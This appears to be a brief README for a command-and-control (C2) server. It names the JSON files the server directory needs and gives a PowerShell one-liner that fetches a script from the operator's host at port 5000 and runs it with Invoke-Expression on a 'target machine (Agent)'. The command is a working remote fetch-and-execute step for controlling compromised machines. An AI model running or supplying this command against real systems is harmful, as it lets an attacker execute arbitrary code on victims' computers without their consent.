# C2
You should include 3 JSON files in /server directory: agents.json, commands_output.json, commands.json

## Custom powershell script usage:

To run custom powershell scripts on target machine (Agent), you can execute this command:
```powershell
Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://[IP]:5000/static/uploads/script.ps1").Content) )
```